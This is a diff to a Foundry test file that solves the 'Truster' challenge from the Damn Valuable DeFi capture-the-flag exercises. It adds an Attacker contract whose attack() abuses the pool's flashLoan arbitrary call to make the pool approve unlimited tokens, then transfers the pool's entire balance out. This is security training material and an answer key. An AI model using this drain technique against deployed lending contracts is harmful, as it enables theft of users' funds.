@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {console2} from "forge-std/console2.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -51,7 +52,8 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        Attacker atk = new Attacker(pool, token, recovery);
+        atk.attack();
     }
 
     /**
@@ -65,4 +67,23 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+
+}
+
+contract Attacker {
+    TrusterLenderPool public pool;
+    DamnValuableToken public token;
+    address public recovery;
+
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+        pool = _pool;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
+        console2.log("allowance", token.allowance(address(pool), address(this)));
+        token.transferFrom(address(pool), recovery, 1_000_000e18);
+    }        
 }
